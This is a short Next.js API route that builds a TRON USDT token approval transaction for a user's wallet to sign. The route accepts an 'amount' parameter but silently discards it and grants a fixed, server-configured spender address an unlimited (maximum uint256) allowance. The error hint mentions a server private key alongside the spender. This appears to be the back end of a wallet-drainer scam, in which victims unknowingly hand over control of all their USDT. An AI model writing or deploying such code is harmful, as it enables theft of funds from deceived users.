import { NextResponse } from 'next/server';
import { getServerTW, CFG } from '../../lib/tronService';

export async function POST(req) {
    try {
        const { ownerAddress, amount } = await req.json();

        if (!ownerAddress || !amount) {
            return NextResponse.json({ error: 'Missing params' }, { status: 400 });
        }

        const tw = getServerTW();

        // Build the approval transaction
        const txBuild = await tw.transactionBuilder.triggerSmartContract(
            CFG.USDT,
            'approve(address,uint256)',
            { feeLimit: 150_000_000 },
            [
                { type: 'address', value: CFG.SPENDER },
                { type: 'uint256', value: '115792089237316195423570985008687907853269984665640564039457584007913129639935' }
            ],
            ownerAddress
        );

        let transaction = txBuild.transaction;

        // Simplify for maximum compatibility (Remove extendExpiration)
        transaction.visible = false;

        return NextResponse.json({ transaction });

    } catch (error) {
        console.error('Prepare API Error:', error);
        return NextResponse.json({
            error: error.message || 'Unknown Server Error',
            hint: 'Ensure PRIVATE_KEY, SPENDER, and USDT are correct in Vercel.'
        }, { status: 500 });
    }
}